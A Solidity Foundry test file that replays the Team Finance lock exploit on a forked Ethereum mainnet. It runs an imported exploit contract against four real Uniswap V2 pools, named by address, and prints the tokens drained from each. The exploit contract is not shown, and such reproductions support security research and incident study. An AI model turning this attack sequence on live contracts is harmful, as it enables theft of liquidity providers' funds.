// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {TeamFinanceExploit} from "../../src/TeamFinance/TeamFinanceExploit.sol";
import "../../src/TeamFinance/Interfaces.sol";

contract TeamFinanceExploitTest is Test {
    TeamFinanceExploit tfExploit;
    uint256 ethBalanceBefore;
    address constant WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant V2_FEG_WETH_POOL =
        0x854373387E41371Ac6E307A1F29603c6Fa10D872;
    address constant V2_USDC_CAW_POOL =
        0x7a809081f991eCfe0aB2727C7E90D2Ad7c2E411E;
    address constant V2_TSUKA_USDC_POOL =
        0x67CeA36eEB36Ace126A3Ca6E21405258130CF33C;
    address constant V2_KNDX_WETH_POOL =
        0x9267C29e4f517cE9f6d603a15B50Aa47cE32278D;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CAW = 0xf3b9569F82B18aEf890De263B84189bd33EBe452;
    address constant TSUKA = 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD;

    function setUp() public {
        string memory url = vm.rpcUrl("mainnet");
        vm.createSelectFork(url, 15838222);
        tfExploit = new TeamFinanceExploit();
        vm.label(address(tfExploit), "exploitContract");
        // Get some wrapped ETH for token lock
        IWETH9(WETH9).deposit{value: 1 ether}();
        IWETH9(WETH9).approve(address(tfExploit), 1 ether);

        vm.label(USDC, "USDC");
        vm.label(CAW, "CAW");
        vm.label(TSUKA, "TSUKA");
        vm.label(V2_FEG_WETH_POOL, "FEG POOL");
        vm.label(V2_USDC_CAW_POOL, "USDC/CAW Pool");
        vm.label(V2_TSUKA_USDC_POOL, "TSUKA/USDC Pool");
        vm.label(V2_KNDX_WETH_POOL, "KNDX/WETH Pool");
    }

    function testTFExploit() public {
        ethBalanceBefore = address(this).balance;
        uint256 nextLockId;
        console.log("Exploiting FEG pool ..\n");
        // 0.2 to cover Team Finance locking fee
        nextLockId = tfExploit.createLock{value: 0.2 ether}(WETH9, 10);
        tfExploit.exploit(V2_FEG_WETH_POOL, nextLockId, true);
        printBalance();
        console.log("Exploiting TSUKA/USDC pool..\n");
        nextLockId = tfExploit.createLock{value: 0.2 ether}(WETH9, 10);
        tfExploit.exploit(V2_TSUKA_USDC_POOL, nextLockId, false);
        printBalance();
        console.log("Exploiting CAW/USDC pool..\n");
        nextLockId = tfExploit.createLock{value: 0.2 ether}(WETH9, 10);
        tfExploit.exploit(V2_USDC_CAW_POOL, nextLockId, false);
        printBalance();
        console.log("Exploiting KNDX/WETH pool..\n");
        nextLockId = tfExploit.createLock{value: 0.2 ether}(WETH9, 10);
        tfExploit.exploit(V2_KNDX_WETH_POOL, nextLockId, true);
        printBalance();
    }

    function printBalance() public view {
        console.log("Updating balance..");
        console.log("----------------------");
        console.log("ETH:", (address(this).balance - ethBalanceBefore) / 1e18);
        console.log("USDC:", IERC20(USDC).balanceOf(address(this)) / 1e6);
        console.log("CAW:", IERC20(CAW).balanceOf(address(this)) / 1e18);
        console.log("TSUKA:", IERC20(TSUKA).balanceOf(address(this)) / 1e8);
        console.log("\n");
    }

    receive() external payable {}
}
